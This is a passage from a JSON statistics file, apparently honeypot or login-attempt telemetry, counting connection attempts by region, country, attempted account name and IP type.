    ""Hanoi"": 15,
    ""Moscow"": 63,
    ""Mariehamns stad"": 3,
    ""Flanders"": 6,
    ""Ho Chi Minh"": 36,
    ""Michigan"": 3,
    ""Kaunas"": 12,
    ""California"": 51,
    ""Hesse"": 3,
    ""Guangdong"": 3,
    ""North East"": 3,
    ""Jeollabuk-do"": 3
  },
  ""country"": {
    ""United States"": 462,
    ""Canada"": 21,
    ""China"": 483,
    ""India"": 6,
    ""Brazil"": 117,
    ""Egypt"": 6,
    ""Iran"": 123,
    ""Bulgaria"": 78,
    ""Lithuania"": 27,
    ""Netherlands"": 30,
    ""Singapore"": 84,
    ""Hong Kong"": 24,
    ""Colombia"": 9,
    ""Ukraine"": 24,
    ""Vietnam"": 51,
    ""Russia"": 63,
    ""Aland Islands"": 3,
    ""Belgium"": 6,
    ""Germany"": 3,
    ""South Korea"": 3
  },
  ""account"": {
    ""142.93.8.59"": 1149,
    ""hello"": 306,
    ""Test"": 27,
    ""Administr"": 54,
    ""(empty)"": 9,
    ""Domain"": 54,
    ""Administrator"": 6,
    ""cAuDrhwil"": 3,
    ""YTcNHW"": 3,
    ""AcAkOz"": 3,
    ""OhqpvqbQP"": 3,
    ""xdNmqu"": 3,
    ""lPNgoV"": 3
  },
  ""keyboard"": {
    ""Unknown"": 1623
  },
  ""client_build"": {
    ""Unknown"": 1623
  },
  ""client_name"": {
    ""Unknown"": 1623
  },
  ""ip_type"": {
    ""Unknown"": 1071,
    ""hosting & proxy"": 24,
    ""hosting"": 462,
    ""mobile"": 60,
    ""proxy"": 6
  }
}"
